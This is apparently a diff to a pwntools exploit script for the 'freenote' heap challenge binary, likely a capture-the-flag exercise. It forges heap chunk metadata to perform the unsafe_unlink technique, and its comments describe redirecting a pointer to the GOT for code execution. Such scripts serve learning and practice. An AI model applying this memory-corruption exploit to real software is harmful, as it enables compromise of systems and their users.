@@ -4,9 +4,9 @@
 
 from pwn import *
 
-r = process('./freenote')
+r = process('./freenote-')
 
-b = ELF('./freenote')
+b = ELF('./freenote-')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 context.arch = b.arch
@@ -149,13 +149,15 @@ if __name__ == "__main__":
     # prepare heap feng shui suitable for "unsafe_unlink" technique (refer shellphish's how2heap)
     #
 
-    new_note('A'*0x100)
-    new_note('B'*0x100)
-    new_note('C'*0x100)
+    new_note('A'*0x80)
+    new_note('B'*0x80)
     
-    delete_note(2)
+    raw_input('after alloc two chunks...')
+
     delete_note(1)
     delete_note(0)
+
+    raw_input('after free two chunks...')
 
     #
     # Step 2)
@@ -177,6 +179,17 @@ if __name__ == "__main__":
     # FD->bk == P && BK->fd == P
     # 
 
+    target = leaked_heap - (0x10a6820-0x10a5030)
+
+    log.info('target address: 0x%x' % target)
+
+    new_note(p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32) + p64(0x80) + p64(0x90) + 'B'*(0x80))
+
+    raw_input('after overwriting metadata...')
+
+    log.info('trying to free 0x%x...' % (leaked_heap+8*4+0x80))
+    raw_input('before free...')
+
     #
     # Step 3)
     # 
@@ -185,3 +198,7 @@ if __name__ == "__main__":
     # With [PTR TO CHUNK] which points itself, we can overwrite [PTR TO CHUNK] to point GOT by edit_note().
     # With [PTR TO CHUNK] which points GOT, doing edit_note() again will end this misery.
     #
+
+    delete_note(1)
+
+    raw_input('after deleting note_1...')
